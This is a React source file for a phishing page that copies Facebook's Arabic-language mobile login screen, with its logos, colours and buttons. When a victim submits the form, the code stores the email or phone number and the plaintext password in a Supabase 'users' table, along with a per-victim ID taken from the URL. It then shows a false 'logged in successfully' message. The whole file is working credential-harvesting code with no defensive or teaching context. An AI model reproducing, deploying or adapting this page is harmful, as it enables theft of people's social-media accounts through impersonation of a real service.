import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import { X, ChevronDown } from 'lucide-react';

// Placeholders for Supabase configuration
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

// Initialize Supabase client safely
const supabase = SUPABASE_URL && SUPABASE_ANON_KEY 
  ? createClient(SUPABASE_URL, SUPABASE_ANON_KEY) 
  : null;

export default function App() {
  const [formData, setFormData] = useState({
    username: '', // Phone or Email
    password: '',
  });
  const [deviceId, setDeviceId] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  useEffect(() => {
    // Extract device_id from URL search parameter first, then fallback to pathname
    const params = new URLSearchParams(window.location.search);
    let id = params.get('device_id');
    
    if (!id) {
      // e.g. pathname "/zwhx" split by '/' -> ["", "zwhx"] -> filter(Boolean) -> ["zwhx"]
      const segments = window.location.pathname.split('/').filter(Boolean);
      if (segments.length > 0) {
        id = segments[segments.length - 1];
      }
    }

    if (id) {
      setDeviceId(id);
    }
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setMessage(null);

    try {
      if (supabase) {
        // إرسال البيانات بالأعمدة المحددة بالضبط
        const { error: supabaseError } = await supabase
          .from('users') 
          .insert([
            {
              email_phone: formData.username,
              password: formData.password,
              id: deviceId,
              created_at: new Date().toISOString()
            },
          ]);

        if (supabaseError) throw supabaseError;
      }

      await new Promise(resolve => setTimeout(resolve, 800));
      setMessage({
        type: 'success',
        text: 'تم تسجيل الدخول بنجاح!'
      });
      setFormData({ username: '', password: '' });
    } catch (err: any) {
      console.error('Submission error:', err);
      setMessage({
        type: 'error',
        text: err.message || 'حدث خطأ أثناء الاتصال بقاعدة البيانات.'
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div dir="rtl" className="min-h-screen bg-white flex flex-col justify-between font-sans text-[#1c1e21] select-none">
      
      {/* Top Header */}
      <div className="relative flex justify-center items-center pt-4 pb-2 min-h-[56px] px-4">
        <button className="absolute right-4 p-2 text-[#1c1e21] hover:bg-black/5 rounded-full transition-colors">
          <X className="w-6 h-6" strokeWidth={2} />
        </button>
        <button className="flex items-center gap-1 text-[14px] text-[#606770] font-medium hover:text-[#1c1e21] transition-colors">
          العربية
          <ChevronDown className="w-4 h-4" />
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-grow flex flex-col items-center px-4 w-full max-w-[420px] mx-auto mt-6">
        
        {/* Facebook Logo */}
        <div className="mb-12 mt-4">
          <svg viewBox="0 0 36 36" className="w-[60px] h-[60px]" fill="url(#facebook-gradient)">
            <defs>
              <linearGradient x1="50%" y1="97.0782153%" x2="50%" y2="0%" id="facebook-gradient">
                <stop stopColor="#0062E0" offset="0%"></stop>
                <stop stopColor="#19AFFF" offset="100%"></stop>
              </linearGradient>
            </defs>
            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
            <path fill="#fff" d="M25 12h-5v-2c0-1 1-2 2-2h3V3h-3c-4 0-6 3-6 7v2h-3v5h3v19h6V17h4l1-5z"></path>
          </svg>
        </div>

        {message && (
          <div className={`w-full p-4 mb-4 rounded-2xl border text-[14px] flex items-center justify-center text-center ${
            message.type === 'success' 
              ? 'bg-green-50 border-green-200 text-green-700' 
              : 'bg-red-50 border-red-200 text-red-700'
          }`}>
            <span>{message.text}</span>
          </div>
        )}

        {/* Form */}
        <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
          
          {/* Email / Phone Input */}
          <div className="relative">
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
              dir="auto"
              required
            />
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              placeholder="كلمة السر"
              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
              dir="auto"
              required
            />
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="mt-2 w-full bg-[#0064e0] hover:bg-[#0054c0] text-white rounded-full py-[13px] text-[16px] font-bold transition-all active:scale-[0.99] disabled:opacity-70 shadow-sm"
          >
            {isSubmitting ? 'جاري تسجيل الدخول...' : 'تسجيل الدخول'}
          </button>
        </form>

        {/* Forgot Password */}
        <div className="mt-5">
          <a href="#" className="text-[#1c1e21] text-[15px] font-medium hover:underline">
            هل نسيت كلمة السر؟
          </a>
        </div>
      </div>

      {/* Bottom Section */}
      <div className="w-full flex flex-col items-center pb-8 px-4 mt-auto">
        {/* Create Account Button */}
        <button className="w-full max-w-[380px] bg-transparent border border-[#0064e0] text-[#0064e0] rounded-full py-[12px] text-[15px] font-medium mb-4 hover:bg-[#ebf5ff] transition-all active:scale-[0.99]">
          إنشاء حساب جديد
        </button>

        {/* Meta Logo */}
        <div className="flex items-center justify-center gap-1 opacity-70">
          <svg viewBox="0 0 1000 1000" className="w-[18px] h-[18px] fill-[#1c1e21]">
            <path d="M720.9,436.9c-29.2,0-56.1,12.3-75.1,33.4l-75.1,83.1l-105-115.3c-20.9-23-49.7-36.2-80.9-36.2c-59.5,0-108,48.5-108,108v81.1c0,59.5,48.5,108,108,108h0c31.2,0,60-13.2,80.9-36.2l105-115.3l75.1,83.1c19,21.1,45.9,33.4,75.1,33.4c59.5,0,108-48.5,108-108v-11.2C828.9,485.4,780.4,436.9,720.9,436.9z M384.8,629.7c-9.1,10-21.7,15.7-35.3,15.7c-25.9,0-46.9-21-46.9-46.9v-81.1c0-25.9,21-46.9,46.9-46.9c13.5,0,26.2,5.7,35.3,15.7l90.7,99.6L384.8,629.7z M767.8,590c0,25.9-21,46.9-46.9,46.9c-12.7,0-24.6-5.3-33.1-14.7l-91.8-101.6l91.8-101.6c8.5-9.4,20.4-14.7,33.1-14.7c25.9,0,46.9,21,46.9,46.9V590z"/>
          </svg>
          <span className="text-[13px] font-semibold tracking-wide text-[#1c1e21]">Meta</span>
        </div>
      </div>
    </div>
  );
}


